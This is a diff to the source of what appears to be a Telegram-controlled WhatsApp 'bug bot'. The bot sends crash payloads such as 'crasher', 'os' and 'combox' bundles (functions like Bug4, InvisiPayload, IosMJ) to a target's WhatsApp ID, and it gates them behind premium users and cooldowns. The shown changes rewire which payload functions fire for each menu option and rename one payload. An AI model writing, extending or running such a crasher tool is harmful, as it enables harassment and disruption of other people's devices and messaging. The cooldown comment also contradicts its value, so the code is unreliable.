@@ -16,7 +16,7 @@ function isPremium(userId) {
   return premiumUsers.includes(userId.toString());
 }
 const cooldowns = new Map();
-const COOLDOWN_TIME = 80 * 5000; // 60 detik
+const COOLDOWN_TIME = 80 * 1000; // 60 detik
 const crypto = require("crypto");
 const path = require("path");
 const token = config.BOT_TOKEN;
@@ -596,7 +596,7 @@ async function Bug4(sock, jid) {
   });
 }
 
-async function  Bug444(sock, jid) {
+async function  Bug9(sock, jid) {
 const stanza = [
 {
 attrs: { biz_bot: '1' },
@@ -1468,8 +1468,8 @@ bot.on("callback_query", async (callbackQuery) => {
   const [bugType, jid] = data.split("_");
 
   const bugTypes = {
-    "crasher": [Bug444],
-    "notag": [Bug4, Bug1, Bug3, Bug4],
+    "crasher": [Bug4, InvisiPayload, InvisiPayload, Bug4],
+    "notag": [Bug9, Bug1, Bug3, Bug4],
     "os": [IosMJ, IosMJ, IosMJ, NoIos, NoIos, NoIos, NoIos, NoIos],
     "combox": [Bug4, InvisiPayload, crashui, Bug4,Bug4, crashui, InvisiPayload, Bug4],
     "manuver": [Bug4, Bug3, Bug2, InvisiPayload, Bug4, Bug4],
